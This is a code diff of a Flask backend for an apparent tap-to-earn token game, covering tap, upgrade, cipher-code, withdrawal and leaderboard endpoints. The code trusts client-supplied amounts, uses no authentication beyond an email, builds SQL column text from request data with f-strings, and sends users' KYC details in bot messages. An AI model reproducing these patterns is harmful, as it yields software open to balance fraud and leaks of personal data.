-        status, balance, profit, tap_power, c1, c2, c3, c4, ref_count, last_sync = user
-        now = time.time()
-        
-        if status == 'approved' and last_sync > 0:
-            elapsed_hours = (now - last_sync) / 3600.0
-            offline_gain = elapsed_hours * profit
-            balance += offline_gain
-            
-        c.execute("UPDATE users SET balance = ?, last_sync = ? WHERE email=?", (balance, now, email))
-        conn.commit()
-        conn.close()
-        
-        return jsonify({
-            "status": status, "balance": balance, "profit_per_hour": profit, "tap_power": tap_power,
-            "card1": c1, "card2": c2, "card3": c3, "card4": c4, "ref_count": ref_count
-        })
-    conn.close()
-    return jsonify({"status": "not_found"})
 
 @app.route('/api/tap', methods=['POST'])
 def tap():
-    email = request.json.get('email')
-    power = request.json.get('power', 0.001)
-    conn = sqlite3.connect('game.db')
-    c = conn.cursor()
-    c.execute("UPDATE users SET balance = balance + ? WHERE email=?", (power, email))
-    conn.commit()
-    c.execute("SELECT balance FROM users WHERE email=?", (email,))
-    new_balance = c.fetchone()[0]
-    conn.close()
-    return jsonify({"success": True, "balance": new_balance})
+    data = request.json
+    user = get_user(data['email'])
+    new_bal = user[10] + data['power']
+    update_user(data['email'], "balance = ?, total_taps = total_taps + 1", (new_bal,))
+    return jsonify({"success": True, "balance": new_bal})
 
 @app.route('/api/upgrade', methods=['POST'])
 def upgrade():
-    email = request.json.get('email')
-    utype = request.json.get('type')
-    cost = request.json.get('cost')
-    conn = sqlite3.connect('game.db')
-    c = conn.cursor()
-    c.execute("SELECT balance FROM users WHERE email=?", (email,))
-    bal = c.fetchone()[0]
+    data = request.json
+    user = get_user(data['email'])
+    if user[10] < data['cost']: return jsonify({"success": False, "message": "Not enough TTN"})
     
-    if bal >= cost:
-        profit_add = 0
-        if utype == 'card1': profit_add = 10
-        elif utype == 'card2': profit_add = 60
-        elif utype == 'card3': profit_add = 300
-        elif utype == 'card4': profit_add = 1500
-
-        c.execute(f"UPDATE users SET balance = balance - ?, profit_per_hour = profit_per_hour + ?, {utype} = {utype} + 1 WHERE email=?", (cost, profit_add, email))
-        conn.commit()
-        
-        c.execute("SELECT balance, profit_per_hour, tap_power, card1, card2, card3, card4, ref_count FROM users WHERE email=?", (email,))
-        user = c.fetchone()
-        conn.close()
-        return jsonify({
-            "success": True, "balance": user[0], "profit_per_hour": user[1], "tap_power": user[2],
-            "card1": user[3], "card2": user[4], "card3": user[5], "card4": user[6], "ref_count": user[7]
-        })
-    conn.close()
-    return jsonify({"success": False, "message": "Not enough TTN!"})
+    p_add = {'card1': 10, 'card2': 60, 'card3': 300, 'card4': 1500}[data['type']]
+    new_bal = user[10] - data['cost']
+    update_user(data['email'], f"balance = ?, profit_per_hour = profit_per_hour + ?, {data['type']} = {data['type']} + 1", (new_bal, p_add))
+    
+    u = get_user(data['email'])
+    return jsonify({"success": True, "balance": u[10], "profit_per_hour": u[11], "card1": u[16], "card2": u[17], "card3": u[18], "card4": u[19]})
 
 @app.route('/api/cipher', methods=['POST'])
 def cipher():
-    email = request.json.get('email')
-    code = request.json.get('code').upper()
+    if request.json.get('code').upper() != "TITAN": return jsonify({"success": False, "message": "Wrong code"})
+    user = get_user(request.json['email'])
+    new_bal = user[10] + 500
+    update_user(request.json['email'], "balance = ?", (new_bal,))
+    return jsonify({"success": True, "balance": new_bal})
+
+@app.route('/api/withdraw_req', methods=['POST'])
+def withdraw_req():
+    if not SETTINGS["withdraw_active"]: return jsonify({"message": "Withdrawal system is currently disabled by admin."})
+    user = get_user(request.json['email'])
+    if user[10] < SETTINGS["min_withdraw"]: return jsonify({"message": f"Minimum withdrawal is {SETTINGS['min_withdraw']} TTN"})
     
-    if code == "TITAN":
-        conn = sqlite3.connect('game.db')
-        c = conn.cursor()
-        c.execute("UPDATE users SET balance = balance + 500.0 WHERE email=?", (email,))
-        conn.commit()
-        c.execute("SELECT balance FROM users WHERE email=?", (email,))
-        new_bal = c.fetchone()[0]
-        conn.close()
-        return jsonify({"success": True, "balance": new_bal})
-    
-    return jsonify({"success": False, "message": "Wrong code!"})
+    bot.send_message(ADMIN_ID, f"💸 **Withdraw Request**\n📧 {user[1]}\n💰 {user[10]} TTN\n👤 KYC: {user[4]} {user[5]}\n🆔 {user[6]}\n📱 {user[7]}")
+    return jsonify({"message": "Withdrawal request submitted. Pending admin approval."})
 
 @app.route('/api/leaderboard')
 def leaderboard():
     conn = sqlite3.connect('game.db')
     c = conn.cursor()
-    c.execute("SELECT name, balance FROM users WHERE status='approved' ORDER BY balance DESC LIMIT 10")
-    users = [{"name": u[0], "balance": u[1]} for u in c.fetchall()]
+    c.execute("SELECT email, balance FROM users ORDER BY balance DESC LIMIT 10")
+    users = [{"name": u[0].split('@')[0], "balance": u[1]} for u in c.fetchall()]
     conn.close()
     return jsonify(users)
 
